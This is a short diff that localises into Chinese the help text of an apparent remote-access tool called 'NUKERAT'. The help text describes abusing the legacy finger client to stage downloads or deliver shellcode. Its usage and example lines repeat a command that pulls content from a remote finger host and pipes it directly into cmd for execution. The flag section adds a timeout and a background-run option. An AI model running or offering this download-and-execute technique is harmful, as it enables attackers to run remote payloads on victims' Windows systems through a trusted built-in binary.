@@ -1,17 +1,17 @@
-ABOUT
+关于
     Legacy user information client for remote Finger services.
     Piped output can feed follow-on command execution for staged
     download or shellcode delivery.
 
-USAGE:
+用法：
     finger user@example.host.com | more +2 | cmd
 
-EXAMPLES:
+示例：
     finger user@example.host.com | more +2 | cmd
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     finger user@example.host.com | more +2 | cmd
